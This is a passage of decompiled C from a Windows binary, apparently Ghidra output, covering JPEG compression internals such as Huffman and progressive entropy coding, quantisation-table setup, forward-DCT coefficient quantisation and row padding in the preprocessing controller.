        do {
          param_1 = (int *)((int)param_1 + 1);
          uVar7 = (int)uVar7 >> 1;
        } while (uVar7 != 0);
        if (0xb < (int)param_1) {
          *(undefined4 *)(*piVar5 + 0x14) = 6;
          (**(code **)*piVar5)(piVar5);
        }
      }
      FUN_0040c690(*(int *)(iVar4 + 0x14),(int)param_1);
      if (param_1 != (int *)0x0) {
        FUN_0040c5d2(local_c,(uint)param_1);
      }
      local_8 = local_8 + 1;
      local_10 = local_10 + 1;
    } while (local_8 < piVar5[0x40]);
  }
  *(undefined4 *)piVar5[6] = *(undefined4 *)(iVar3 + 0x10);
  uVar7 = piVar5[6];
  *(undefined4 *)(uVar7 + 4) = *(undefined4 *)(iVar3 + 0x14);
  if (piVar5[0x2f] != 0) {
    if (*(int *)(iVar3 + 0x44) == 0) {
      uVar7 = *(int *)(iVar3 + 0x48) + 1U & 7;
      *(int *)(iVar3 + 0x44) = piVar5[0x2f];
      *(uint *)(iVar3 + 0x48) = uVar7;
    }
    *(int *)(iVar3 + 0x44) = *(int *)(iVar3 + 0x44) + -1;
  }
  return CONCAT31((int3)(uVar7 >> 8),1);
}



undefined4 __cdecl FUN_0040c8e9(int *param_1,int *param_2)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *piVar5;
  int iVar6;
  uint uVar7;
  int iVar8;
  uint local_c;
  
  piVar5 = param_1;
  iVar1 = param_1[0x4e];
  iVar2 = param_1[0x57];
  iVar3 = param_1[0x4c];
  *(undefined4 *)(iVar2 + 0x10) = *(undefined4 *)param_1[6];
  *(undefined4 *)(iVar2 + 0x14) = *(undefined4 *)(param_1[6] + 4);
  if ((param_1[0x2f] != 0) && (*(int *)(iVar2 + 0x44) == 0)) {
    FUN_0040c749((char)*(undefined4 *)(iVar2 + 0x48));
  }
  iVar4 = *param_2;
  param_1 = (int *)0x0;
  iVar6 = piVar5[0x4b];
  if (iVar6 <= iVar3) {
    do {
      iVar8 = (int)*(short *)(iVar4 + (&DAT_00424bb8)[iVar6] * 2);
      if (iVar8 == 0) {
LAB_0040c967:
        param_1 = (int *)((int)param_1 + 1);
      }
      else {
        if (iVar8 < 0) {
          uVar7 = -iVar8 >> ((byte)iVar1 & 0x1f);
          local_c = ~uVar7;
        }
        else {
          uVar7 = iVar8 >> ((byte)iVar1 & 0x1f);
          local_c = uVar7;
        }
        if (uVar7 == 0) goto LAB_0040c967;
        if (*(int *)(iVar2 + 0x38) != 0) {
          FUN_0040c6e2();
        }
        if (0xf < (int)param_1) {
          param_2 = (int *)(((uint)(param_1 + -4) >> 4) + 1);
          param_1 = param_1 + (int)param_2 * -4;
          do {
            FUN_0040c690(*(int *)(iVar2 + 0x34),0xf0);
            param_2 = (int *)((int)param_2 + -1);
          } while (param_2 != (int *)0x0);
        }
        iVar8 = (int)uVar7 >> 1;
        param_2 = (int *)0x1;
        if (iVar8 != 0) {
          do {
            param_2 = (int *)((int)param_2 + 1);
            iVar8 = iVar8 >> 1;
          } while (iVar8 != 0);
          if (10 < (int)param_2) {
            *(undefined4 *)(*piVar5 + 0x14) = 6;
            (**(code **)*piVar5)(piVar5);
          }
        }
        FUN_0040c690(*(int *)(iVar2 + 0x34),(int)(param_2 + (int)param_1 * 4));
        FUN_0040c5d2(local_c,(uint)param_2);
        param_1 = (int *)0x0;
      }
      iVar6 = iVar6 + 1;
    } while (iVar6 <= iVar3);
    if ((0 < (int)param_1) &&
       (*(int *)(iVar2 + 0x38) = *(int *)(iVar2 + 0x38) + 1, *(int *)(iVar2 + 0x38) == 0x7fff)) {
      FUN_0040c6e2();
    }
  }
  *(undefined4 *)piVar5[6] = *(undefined4 *)(iVar2 + 0x10);
  uVar7 = piVar5[6];
  *(undefined4 *)(uVar7 + 4) = *(undefined4 *)(iVar2 + 0x14);
  if (piVar5[0x2f] != 0) {
    if (*(int *)(iVar2 + 0x44) == 0) {
      uVar7 = *(int *)(iVar2 + 0x48) + 1U & 7;
      *(int *)(iVar2 + 0x44) = piVar5[0x2f];
      *(uint *)(iVar2 + 0x48) = uVar7;
    }
    *(int *)(iVar2 + 0x44) = *(int *)(iVar2 + 0x44) + -1;
  }
  return CONCAT31((int3)(uVar7 >> 8),1);
}



undefined4 __cdecl FUN_0040ca72(int param_1,int param_2)

{
  undefined4 uVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  
  uVar1 = *(undefined4 *)(param_1 + 0x138);
  iVar2 = *(int *)(param_1 + 0x15c);
  *(undefined4 *)(iVar2 + 0x10) = **(undefined4 **)(param_1 + 0x18);
  *(undefined4 *)(iVar2 + 0x14) = *(undefined4 *)(*(int *)(param_1 + 0x18) + 4);
  if ((*(int *)(param_1 + 0xbc) != 0) && (*(int *)(iVar2 + 0x44) == 0)) {
    FUN_0040c749((char)*(undefined4 *)(iVar2 + 0x48));
  }
  iVar4 = 0;
  if (0 < *(int *)(param_1 + 0x100)) {
    do {
      FUN_0040c5d2((int)(**(short **)(param_2 + iVar4 * 4) >> ((byte)uVar1 & 0x1f)),1);
      iVar4 = iVar4 + 1;
    } while (iVar4 < *(int *)(param_1 + 0x100));
  }
  **(undefined4 **)(param_1 + 0x18) = *(undefined4 *)(iVar2 + 0x10);
  uVar3 = *(uint *)(param_1 + 0x18);
  *(undefined4 *)(uVar3 + 4) = *(undefined4 *)(iVar2 + 0x14);
  if (*(int *)(param_1 + 0xbc) != 0) {
    if (*(int *)(iVar2 + 0x44) == 0) {
      uVar3 = *(int *)(iVar2 + 0x48) + 1U & 7;
      *(int *)(iVar2 + 0x44) = *(int *)(param_1 + 0xbc);
      *(uint *)(iVar2 + 0x48) = uVar3;
    }
    *(int *)(iVar2 + 0x44) = *(int *)(iVar2 + 0x44) + -1;
  }
  return CONCAT31((int3)(uVar3 >> 8),1);
}



undefined4 __cdecl FUN_0040cb1d(int param_1,int *param_2)

{
  undefined4 uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  int aiStack_118 [64];
  int local_18;
  int local_14;
  int local_10;
  int local_c;
  int local_8;
  
  iVar3 = param_1;
  local_c = *(int *)(param_1 + 0x130);
  uVar1 = *(undefined4 *)(param_1 + 0x138);
  iVar2 = *(int *)(param_1 + 0x15c);
  *(undefined4 *)(iVar2 + 0x10) = **(undefined4 **)(param_1 + 0x18);
  *(undefined4 *)(iVar2 + 0x14) = *(undefined4 *)(*(int *)(param_1 + 0x18) + 4);
  if ((*(int *)(param_1 + 0xbc) != 0) && (*(int *)(iVar2 + 0x44) == 0)) {
    FUN_0040c749((char)*(undefined4 *)(iVar2 + 0x48));
  }
  iVar7 = *param_2;
  local_10 = 0;
  iVar6 = *(int *)(param_1 + 300);
  local_18 = iVar7;
  for (; iVar6 <= local_c; iVar6 = iVar6 + 1) {
    iVar4 = (int)*(short *)(iVar7 + (&DAT_00424bb8)[iVar6] * 2);
    if (iVar4 < 0) {
      iVar4 = -iVar4;
    }
    iVar4 = iVar4 >> ((byte)uVar1 & 0x1f);
    aiStack_118[iVar6] = iVar4;
    if (iVar4 == 1) {
      local_10 = iVar6;
    }
  }
  local_8 = *(int *)(param_1 + 300);
  param_1 = 0;
  param_2 = (int *)0x0;
  iVar7 = *(int *)(iVar2 + 0x40) + *(int *)(iVar2 + 0x3c);
  if (local_8 <= local_c) {
    do {
      local_14 = aiStack_118[local_8];
      if (aiStack_118[local_8] == 0) {
        param_1 = param_1 + 1;
      }
      else {
        while ((0xf < param_1 && (local_8 <= local_10))) {
          FUN_0040c6e2();
          FUN_0040c690(*(int *)(iVar2 + 0x34),0xf0);
          param_1 = param_1 + -0x10;
          FUN_0040c6ba((int)param_2);
          iVar7 = *(int *)(iVar2 + 0x40);
          param_2 = (int *)0x0;
        }
        if (local_14 < 2) {
          FUN_0040c6e2();
          FUN_0040c690(*(int *)(iVar2 + 0x34),param_1 * 0x10 + 1);
          FUN_0040c5d2((uint)(-1 < *(short *)(local_18 + (&DAT_00424bb8)[local_8] * 2)),1);
          FUN_0040c6ba((int)param_2);
          param_2 = (int *)0x0;
          iVar7 = *(int *)(iVar2 + 0x40);
          param_1 = 0;
        }
        else {
          *(byte *)(iVar7 + (int)param_2) = (byte)local_14 & 1;
          param_2 = (int *)((int)param_2 + 1);
        }
      }
      local_8 = local_8 + 1;
    } while (local_8 <= local_c);
    if ((0 < param_1) || (param_2 != (int *)0x0)) {
      *(int *)(iVar2 + 0x38) = *(int *)(iVar2 + 0x38) + 1;
      *(int *)(iVar2 + 0x3c) = *(int *)(iVar2 + 0x3c) + (int)param_2;
      if ((*(int *)(iVar2 + 0x38) == 0x7fff) || (0x3a9 < *(uint *)(iVar2 + 0x3c))) {
        FUN_0040c6e2();
      }
    }
  }
  **(undefined4 **)(iVar3 + 0x18) = *(undefined4 *)(iVar2 + 0x10);
  uVar5 = *(uint *)(iVar3 + 0x18);
  *(undefined4 *)(uVar5 + 4) = *(undefined4 *)(iVar2 + 0x14);
  if (*(int *)(iVar3 + 0xbc) != 0) {
    if (*(int *)(iVar2 + 0x44) == 0) {
      uVar5 = *(int *)(iVar2 + 0x48) + 1U & 7;
      *(int *)(iVar2 + 0x44) = *(int *)(iVar3 + 0xbc);
      *(uint *)(iVar2 + 0x48) = uVar5;
    }
    *(int *)(iVar2 + 0x44) = *(int *)(iVar2 + 0x44) + -1;
  }
  return CONCAT31((int3)(uVar5 >> 8),1);
}



void __cdecl FUN_0040cd39(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  void *pvVar4;
  void **ppvVar5;
  int iVar6;
  char local_10 [4];
  int local_c;
  int *local_8;
  
  iVar1 = param_1[0x57];
  FUN_0040c6e2();
  iVar2 = param_1[0x4b];
  _memset(local_10,0,4);
  local_c = 0;
  if (0 < param_1[0x39]) {
    local_8 = param_1 + 0x3a;
    do {
      if (iVar2 != 0) {
        iVar6 = *(int *)(*local_8 + 0x18);
LAB_0040cd9d:
        if (local_10[iVar6] == '\0') {
          iVar3 = iVar6 + 0x16;
          if (iVar2 != 0) {
            iVar3 = iVar6 + 0x1a;
          }
          ppvVar5 = (void **)(param_1 + iVar3);
          if (*ppvVar5 == (void *)0x0) {
            pvVar4 = (void *)FUN_00409e11((int)param_1);
            *ppvVar5 = pvVar4;
          }
          FUN_0040c147(param_1,*ppvVar5,*(int *)(iVar1 + 0x5c + iVar6 * 4));
          local_10[iVar6] = '\x01';
        }
      }
      else if (param_1[0x4d] == 0) {
        iVar6 = *(int *)(*local_8 + 0x14);
        goto LAB_0040cd9d;
      }
      local_c = local_c + 1;
      local_8 = local_8 + 1;
    } while (local_c < param_1[0x39]);
  }
  return;
}



void __cdecl FUN_0040cdf6(int *param_1,char param_2)

{
  void **ppvVar1;
  int iVar2;
  undefined4 uVar3;
  void *pvVar4;
  int iVar5;
  bool bVar6;
  int local_10;
  undefined4 *local_c;
  int *local_8;
  
  iVar2 = param_1[0x57];
  *(int **)(iVar2 + 0x20) = param_1;
  *(char *)(iVar2 + 0xc) = param_2;
  bVar6 = param_1[0x4b] == 0;
  if (param_1[0x4d] == 0) {
    if (bVar6) {
      *(code **)(iVar2 + 4) = FUN_0040c7c1;
    }
    else {
      *(code **)(iVar2 + 4) = FUN_0040c8e9;
    }
  }
  else if (bVar6) {
    *(code **)(iVar2 + 4) = FUN_0040ca72;
  }
  else {
    *(code **)(iVar2 + 4) = FUN_0040cb1d;
    if (*(int *)(iVar2 + 0x40) == 0) {
      uVar3 = (**(code **)param_1[1])(param_1,1,1000);
      *(undefined4 *)(iVar2 + 0x40) = uVar3;
    }
  }
  if (param_2 == '\0') {
    *(undefined **)(iVar2 + 8) = &LAB_0040ccfc;
  }
  else {
    *(code **)(iVar2 + 8) = FUN_0040cd39;
  }
  local_10 = 0;
  if (0 < param_1[0x39]) {
    local_c = (undefined4 *)(iVar2 + 0x24);
    local_8 = param_1 + 0x3a;
    do {
      iVar5 = *local_8;
      *local_c = 0;
      if (bVar6) {
        if (param_1[0x4d] == 0) {
          iVar5 = *(int *)(iVar5 + 0x14);
          goto LAB_0040cebf;
        }
      }
      else {
        iVar5 = *(int *)(iVar5 + 0x18);
        *(int *)(iVar2 + 0x34) = iVar5;
LAB_0040cebf:
        if (param_2 == '\0') {
          FUN_0040b971(param_1,bVar6,iVar5,(int *)(iVar2 + 0x4c + iVar5 * 4));
        }
        else {
          if ((iVar5 < 0) || (3 < iVar5)) {
            *(undefined4 *)(*param_1 + 0x14) = 0x32;
            *(int *)(*param_1 + 0x18) = iVar5;
            (**(code **)*param_1)(param_1);
          }
          ppvVar1 = (void **)(iVar2 + 0x5c + iVar5 * 4);
          if (*ppvVar1 == (void *)0x0) {
            pvVar4 = (void *)(**(code **)param_1[1])(param_1,1,0x404);
            *ppvVar1 = pvVar4;
          }
          _memset(*ppvVar1,0,0x404);
        }
      }
      local_10 = local_10 + 1;
      local_8 = local_8 + 1;
      local_c = local_c + 1;
    } while (local_10 < param_1[0x39]);
  }
  *(undefined4 *)(iVar2 + 0x38) = 0;
  *(undefined4 *)(iVar2 + 0x3c) = 0;
  *(undefined4 *)(iVar2 + 0x18) = 0;
  *(undefined4 *)(iVar2 + 0x1c) = 0;
  iVar5 = param_1[0x2f];
  *(undefined4 *)(iVar2 + 0x48) = 0;
  *(int *)(iVar2 + 0x44) = iVar5;
  return;
}



void __cdecl FUN_0040cf5b(int param_1)

{
  code **ppcVar1;
  code **ppcVar2;
  int iVar3;
  
  ppcVar1 = (code **)(***(code ***)(param_1 + 4))(param_1,1,0x6c);
  *(code ***)(param_1 + 0x15c) = ppcVar1;
  *ppcVar1 = FUN_0040cdf6;
  ppcVar2 = ppcVar1 + 0x17;
  iVar3 = 4;
  do {
    ppcVar2[-4] = (code *)0x0;
    *ppcVar2 = (code *)0x0;
    ppcVar2 = ppcVar2 + 1;
    iVar3 = iVar3 + -1;
  } while (iVar3 != 0);
  ppcVar1[0x10] = (code *)0x0;
  return;
}



void __cdecl FUN_0040cf91(int *param_1)

{
  int **ppiVar1;
  double dVar2;
  int iVar3;
  uint uVar4;
  int iVar5;
  uint *puVar6;
  int iVar7;
  int iVar8;
  int *piVar9;
  short *psVar10;
  double *pdVar11;
  double *pdVar12;
  int local_8;
  
  local_8 = 0;
  iVar3 = param_1[0x56];
  if (0 < param_1[0xf]) {
    puVar6 = (uint *)(param_1[0x11] + 0x10);
    do {
      uVar4 = *puVar6;
      if ((3 < uVar4) || (param_1[uVar4 + 0x12] == 0)) {
        *(undefined4 *)(*param_1 + 0x14) = 0x34;
        *(uint *)(*param_1 + 0x18) = uVar4;
        (**(code **)*param_1)(param_1);
      }
      iVar5 = param_1[uVar4 + 0x12];
      iVar7 = param_1[0x2e];
      if (iVar7 == 0) {
        piVar9 = (int *)(iVar3 + 0xc + uVar4 * 4);
        if (*piVar9 == 0) {
          iVar7 = (**(code **)param_1[1])(param_1,1,0x100);
          *piVar9 = iVar7;
        }
        iVar7 = *piVar9;
        iVar8 = 0;
        do {
          *(uint *)(iVar7 + iVar8 * 4) = (uint)*(ushort *)(iVar5 + iVar8 * 2) << 3;
          iVar8 = iVar8 + 1;
        } while (iVar8 < 0x40);
      }
      else if (iVar7 == 1) {
        ppiVar1 = (int **)(iVar3 + 0xc + uVar4 * 4);
        if (*ppiVar1 == (int *)0x0) {
          piVar9 = (int *)(**(code **)param_1[1])(param_1,1,0x100);
          *ppiVar1 = piVar9;
        }
        piVar9 = *ppiVar1;
        psVar10 = &DAT_00424d18;
        do {
          *piVar9 = (int)((uint)*(ushort *)(iVar5 + -0x424d18 + (int)psVar10) * (int)*psVar10 +
                         0x400) >> 0xb;
          psVar10 = psVar10 + 1;
          piVar9 = piVar9 + 1;
        } while ((int)psVar10 < 0x424d98);
      }
      else if (iVar7 == 2) {
        piVar9 = (int *)(iVar3 + 0x20 + uVar4 * 4);
        if (*piVar9 == 0) {
          iVar7 = (**(code **)param_1[1])(param_1,1,0x100);
          *piVar9 = iVar7;
        }
        iVar7 = *piVar9;
        iVar8 = 0;
        pdVar12 = (double *)&DAT_00424d98;
        do {
          pdVar11 = (double *)&DAT_00424d98;
          do {
            dVar2 = *pdVar11;
            pdVar11 = pdVar11 + 1;
            *(float *)(iVar7 + iVar8 * 4) =
                 1.0 / ((float)(uint)*(ushort *)(iVar5 + iVar8 * 2) * (float)*pdVar12 * (float)dVar2
                       * 8.0);
            iVar8 = iVar8 + 1;
          } while ((int)pdVar11 < 0x424dd8);
          pdVar12 = pdVar12 + 1;
        } while ((int)pdVar12 < 0x424dd8);
      }
      else {
        *(undefined4 *)(*param_1 + 0x14) = 0x30;
        (**(code **)*param_1)(param_1);
      }
      local_8 = local_8 + 1;
      puVar6 = puVar6 + 0x15;
    } while (local_8 < param_1[0xf]);
  }
  return;
}



void __cdecl
FUN_0040d106(int param_1,int param_2,int param_3,int param_4,int param_5,int param_6,int param_7)

{
  int iVar1;
  short sVar2;
  byte *pbVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int local_10c [64];
  code *local_c;
  int local_8;
  
  local_c = *(code **)(*(int *)(param_1 + 0x158) + 8);
  local_8 = *(int *)(*(int *)(param_1 + 0x158) + 0xc + *(int *)(param_2 + 0x10) * 4);
  if (param_7 != 0) {
    param_1 = param_4;
    param_2 = param_7;
    do {
      piVar4 = local_10c;
      iVar5 = 0;
      do {
        pbVar3 = (byte *)(*(int *)(param_3 + param_5 * 4 + iVar5 * 4) + param_6);
        *piVar4 = *pbVar3 - 0x80;
        piVar4[1] = pbVar3[1] - 0x80;
        piVar4[2] = pbVar3[2] - 0x80;
        piVar4[3] = pbVar3[3] - 0x80;
        piVar4[4] = pbVar3[4] - 0x80;
        piVar4[5] = pbVar3[5] - 0x80;
        piVar4[6] = pbVar3[6] - 0x80;
        piVar4[7] = pbVar3[7] - 0x80;
        piVar4 = piVar4 + 8;
        iVar5 = iVar5 + 1;
      } while (iVar5 < 8);
      (*local_c)(local_10c);
      iVar5 = 0;
      do {
        iVar1 = *(int *)(local_8 + iVar5 * 4);
        iVar6 = local_10c[iVar5];
        if (iVar6 < 0) {
          iVar6 = (iVar1 >> 1) - iVar6;
          if (iVar6 < iVar1) {
            sVar2 = 0;
          }
          else {
            sVar2 = (short)(iVar6 / iVar1);
          }
          sVar2 = -sVar2;
        }
        else {
          iVar6 = iVar6 + (iVar1 >> 1);
          if (iVar6 < iVar1) {
            sVar2 = 0;
          }
          else {
            sVar2 = (short)(iVar6 / iVar1);
          }
        }
        *(short *)(param_1 + iVar5 * 2) = sVar2;
        iVar5 = iVar5 + 1;
      } while (iVar5 < 0x40);
      param_1 = param_1 + 0x80;
      param_6 = param_6 + 8;
      param_2 = param_2 + -1;
    } while (param_2 != 0);
  }
  return;
}



void __cdecl
FUN_0040d220(float *param_1,int param_2,int param_3,float *param_4,int param_5,int param_6,
            int param_7)

{
  byte *pbVar1;
  float *pfVar2;
  int iVar3;
  undefined4 extraout_EDX;
  undefined4 uVar4;
  ulonglong uVar5;
  float local_10c [64];
  code *local_c;
  undefined4 local_8;
  
  local_c = *(code **)((int)param_1[0x56] + 0x1c);
  local_8 = *(undefined4 *)((int)param_1[0x56] + 0x20 + *(int *)(param_2 + 0x10) * 4);
  if (param_7 != 0) {
    param_1 = param_4;
    param_2 = param_7;
    do {
      pfVar2 = local_10c;
      iVar3 = 0;
      do {
        pbVar1 = (byte *)(*(int *)(param_3 + param_5 * 4 + iVar3 * 4) + param_6);
        *pfVar2 = (float)(*pbVar1 - 0x80);
        pfVar2[1] = (float)(pbVar1[1] - 0x80);
        pfVar2[2] = (float)(pbVar1[2] - 0x80);
        pfVar2[3] = (float)(pbVar1[3] - 0x80);
        pfVar2[4] = (float)(pbVar1[4] - 0x80);
        pfVar2[5] = (float)(pbVar1[5] - 0x80);
        pfVar2[6] = (float)(pbVar1[6] - 0x80);
        pfVar2[7] = (float)(pbVar1[7] - 0x80);
        pfVar2 = pfVar2 + 8;
        iVar3 = iVar3 + 1;
      } while (iVar3 < 8);
      (*local_c)();
      iVar3 = 0;
      pfVar2 = local_10c;
      uVar4 = extraout_EDX;
      do {
        uVar5 = FUN_00412800(pfVar2,uVar4);
        uVar4 = (undefined4)(uVar5 >> 0x20);
        *(short *)((int)param_1 + iVar3 * 2) = (short)uVar5 + -0x4000;
        iVar3 = iVar3 + 1;
        pfVar2 = param_1;
      } while (iVar3 < 0x40);
      param_1 = param_1 + 0x20;
      param_6 = param_6 + 8;
      param_2 = param_2 + -1;
    } while (param_2 != 0);
  }
  return;
}



void __cdecl FUN_0040d35f(int *param_1)

{
  code **ppcVar1;
  int iVar2;
  
  ppcVar1 = (code **)(**(code **)param_1[1])(param_1,1,0x30);
  param_1[0x56] = (int)ppcVar1;
  *ppcVar1 = FUN_0040cf91;
  iVar2 = param_1[0x2e];
  if (iVar2 == 0) {
    ppcVar1[2] = FUN_0040f065;
  }
  else {
    if (iVar2 != 1) {
      if (iVar2 == 2) {
        ppcVar1[1] = FUN_0040d220;
        ppcVar1[7] = FUN_0040f53b;
      }
      else {
        *(undefined4 *)(*param_1 + 0x14) = 0x30;
        (**(code **)*param_1)(param_1);
      }
      goto LAB_0040d3c9;
    }
    ppcVar1[2] = FUN_0040f35d;
  }
  ppcVar1[1] = FUN_0040d106;
LAB_0040d3c9:
  iVar2 = 4;
  ppcVar1 = ppcVar1 + 8;
  do {
    ppcVar1[-5] = (code *)0x0;
    *ppcVar1 = (code *)0x0;
    ppcVar1 = ppcVar1 + 1;
    iVar2 = iVar2 + -1;
  } while (iVar2 != 0);
  return;
}



void __cdecl FUN_0040d41d(int param_1,size_t param_2,int param_3)

{
  int iVar1;
  int in_EAX;
  
  if (in_EAX < param_3) {
    iVar1 = in_EAX + -1;
    do {
      FUN_00409e55(param_1,iVar1,param_1,in_EAX,1,param_2);
      in_EAX = in_EAX + 1;
    } while (in_EAX < param_3);
  }
  return;
}



void __cdecl
FUN_0040d44b(int param_1,int param_2,uint *param_3,uint param_4,int param_5,uint *param_6,
            uint param_7)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  int *piVar5;
  
  iVar2 = param_1;
  uVar4 = *param_3;
  iVar1 = *(int *)(param_1 + 0x144);
  while( true ) {
    if (param_4 <= uVar4) {
      return;
    }
    if (param_7 <= *param_6) break;
    uVar4 = *(int *)(iVar2 + 0xdc) - *(int *)(iVar1 + 0x34);
    uVar3 = param_4 - *param_3;
    if (uVar3 <= uVar4) {
      uVar4 = uVar3;
    }
    (**(code **)(*(int *)(iVar2 + 0x150) + 4))
              (iVar2,param_2 + *param_3 * 4,iVar1 + 8,*(undefined4 *)(iVar1 + 0x34),uVar4);
    *param_3 = *param_3 + uVar4;
    *(int *)(iVar1 + 0x34) = *(int *)(iVar1 + 0x34) + uVar4;
    piVar5 = (int *)(iVar1 + 0x30);
    *piVar5 = *piVar5 - uVar4;
    if ((*piVar5 == 0) && (*(int *)(iVar1 + 0x34) < *(int *)(iVar2 + 0xdc))) {
      param_1 = 0;
      if (0 < *(int *)(iVar2 + 0x3c)) {
        piVar5 = (int *)(iVar1 + 8);
        do {
          FUN_0040d41d(*piVar5,*(size_t *)(iVar2 + 0x1c),*(int *)(iVar2 + 0xdc));
          param_1 = param_1 + 1;
          piVar5 = piVar5 + 1;
        } while (param_1 < *(int *)(iVar2 + 0x3c));
      }
      *(undefined4 *)(iVar1 + 0x34) = *(undefined4 *)(iVar2 + 0xdc);
    }
    if (*(int *)(iVar1 + 0x34) == *(int *)(iVar2 + 0xdc)) {
      (**(code **)(*(int *)(iVar2 + 0x154) + 4))(iVar2,iVar1 + 8,0,param_5,*param_6);
      *(undefined4 *)(iVar1 + 0x34) = 0;
      *param_6 = *param_6 + 1;
    }
    if ((*(int *)(iVar1 + 0x30) == 0) && (*param_6 < param_7)) {
      param_1 = 0;
      if (0 < *(int *)(iVar2 + 0x3c)) {
        piVar5 = (int *)(*(int *)(iVar2 + 0x44) + 0xc);
        do {
          FUN_0040d41d(*(int *)(param_5 + param_1 * 4),piVar5[4] << 3,*piVar5 * param_7);
          param_1 = param_1 + 1;
          piVar5 = piVar5 + 0x15;
        } while (param_1 < *(int *)(iVar2 + 0x3c));
      }
      *param_6 = param_7;
      return;
    }
    uVar4 = *param_3;
  }
  return;
}



void __cdecl
FUN_0040d593(int param_1,int param_2,uint *param_3,uint param_4,undefined4 param_5,uint *param_6,
            uint param_7)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int iVar4;
  int iVar5;
  uint uVar6;
  int *piVar7;
  int *local_10;
  int local_c;
  int local_8;
  
  iVar3 = param_1;
  iVar1 = *(int *)(param_1 + 0x144);
  iVar4 = *(int *)(param_1 + 0xdc) * 3;
  uVar2 = *param_6;
  do {
    if (param_7 <= uVar2) {
      return;
    }
    uVar2 = *param_3;
    if (uVar2 < param_4) {
      uVar6 = *(int *)(iVar1 + 0x3c) - *(int *)(iVar1 + 0x34);
      if (param_4 - uVar2 <= uVar6) {
        uVar6 = param_4 - uVar2;
      }
      (**(code **)(*(int *)(iVar3 + 0x150) + 4))
                (iVar3,param_2 + uVar2 * 4,iVar1 + 8,*(int *)(iVar1 + 0x34),uVar6);
      if ((*(int *)(iVar1 + 0x30) == *(int *)(iVar3 + 0x20)) &&
         (param_1 = 0, 0 < *(int *)(iVar3 + 0x3c))) {
        iVar5 = *(int *)(iVar3 + 0xdc);
        local_10 = (int *)(iVar1 + 8);
        do {
          local_c = 1;
          if (0 < iVar5) {
            local_8 = -1;
            do {
              FUN_00409e55(*local_10,0,*local_10,local_8,1,*(size_t *)(iVar3 + 0x1c));
              iVar5 = *(int *)(iVar3 + 0xdc);
              local_c = local_c + 1;
              local_8 = local_8 + -1;
            } while (local_c <= iVar5);
          }
          param_1 = param_1 + 1;
          local_10 = local_10 + 1;
        } while (param_1 < *(int *)(iVar3 + 0x3c));
      }
      *param_3 = *param_3 + uVar6;
      *(int *)(iVar1 + 0x34) = *(int *)(iVar1 + 0x34) + uVar6;
      *(int *)(iVar1 + 0x30) = *(int *)(iVar1 + 0x30) - uVar6;
    }
    else {
      if (*(int *)(iVar1 + 0x30) != 0) {
        return;
      }
      if (*(int *)(iVar1 + 0x34) < *(int *)(iVar1 + 0x3c)) {
        param_1 = 0;
        if (0 < *(int *)(iVar3 + 0x3c)) {
          piVar7 = (int *)(iVar1 + 8);
          do {
            FUN_0040d41d(*piVar7,*(size_t *)(iVar3 + 0x1c),*(int *)(iVar1 + 0x3c));
            param_1 = param_1 + 1;
            piVar7 = piVar7 + 1;
          } while (param_1 < *(int *)(iVar3 + 0x3c));
        }
        *(undefined4 *)(iVar1 + 0x34) = *(undefined4 *)(iVar1 + 0x3c);
      }
    }
    if (*(int *)(iVar1 + 0x34) == *(int *)(iVar1 + 0x3c)) {
      (**(code **)(*(int *)(iVar3 + 0x154) + 4))
                (iVar3,iVar1 + 8,*(undefined4 *)(iVar1 + 0x38),param_5,*param_6);
      *param_6 = *param_6 + 1;
      *(int *)(iVar1 + 0x38) = *(int *)(iVar1 + 0x38) + *(int *)(iVar3 + 0xdc);
      if (iVar4 <= *(int *)(iVar1 + 0x38)) {
        *(undefined4 *)(iVar1 + 0x38) = 0;
      }
      if (iVar4 <= *(int *)(iVar1 + 0x34)) {
        *(undefined4 *)(iVar1 + 0x34) = 0;
      }
      *(int *)(iVar1 + 0x3c) = *(int *)(iVar3 + 0xdc) + *(int *)(iVar1 + 0x34);
    }
    uVar2 = *param_6;
  } while( true );
}



void FUN_0040d717(void)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 *_Src;
  undefined4 *puVar3;
  int iVar4;
  int unaff_ESI;
  int local_1c;
  int local_18;
  void **local_14;
  undefined4 *local_10;
  void *local_c;
  int local_8;
  
  iVar4 = *(int *)(unaff_ESI + 0x144);
  iVar1 = *(int *)(unaff_ESI + 0xdc);
  local_8 = (***(code ***)(unaff_ESI + 4))();
  local_18 = 0;
  if (0 < *(int *)(unaff_ESI + 0x3c)) {
    local_c = (void *)(local_8 + iVar1 * 4);
    local_14 = (void **)(iVar4 + 8);
    do {
      _Src = (undefined4 *)(**(code **)(*(int *)(unaff_ESI + 4) + 8))();
      _memcpy(local_c,_Src,iVar1 * 0xc);
      if (0 < iVar1) {
        local_10 = _Src + iVar1 * 2;
        puVar3 = (undefined4 *)(iVar1 * 0x10 + local_8);
        iVar4 = local_8 - (int)_Src;
        local_1c = iVar1;
        do {
          uVar2 = *local_10;
          local_10 = local_10 + 1;
          *(undefined4 *)(iVar4 + (int)_Src) = uVar2;
          *puVar3 = *_Src;
          _Src = _Src + 1;
          puVar3 = puVar3 + 1;
          local_1c = local_1c + -1;
        } while (local_1c != 0);
      }
      *local_14 = local_c;
      local_8 = local_8 + iVar1 * 0x14;
      local_c = (void *)((int)local_c + iVar1 * 0x14);
      local_18 = local_18 + 1;
      local_14 = local_14 + 1;
    } while (local_18 < *(int *)(unaff_ESI + 0x3c));
  }
  return;
}



void __cdecl FUN_0040d81f(int *param_1,char param_2)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  int *piVar3;
  
  if (param_2 != '\0') {
    *(undefined4 *)(*param_1 + 0x14) = 4;
    (**(code **)*param_1)(param_1);
  }
  puVar1 = (undefined4 *)(**(code **)param_1[1])(param_1,1,0x40);
  param_1[0x51] = (int)puVar1;
  *puVar1 = &LAB_0040d3df;
  if (*(char *)(param_1[0x55] + 8) == '\0') {
    puVar1[1] = FUN_0040d44b;
    _param_2 = 0;
    if (0 < param_1[0xf]) {
      piVar3 = (int *)(param_1[0x11] + 8);
      puVar1 = puVar1 + 2;
      do {
        uVar2 = (**(code **)(param_1[1] + 8))
                          (param_1,1,(piVar3[5] * param_1[0x36] * 8) / *piVar3,param_1[0x37]);
        _param_2 = _param_2 + 1;
        *puVar1 = uVar2;
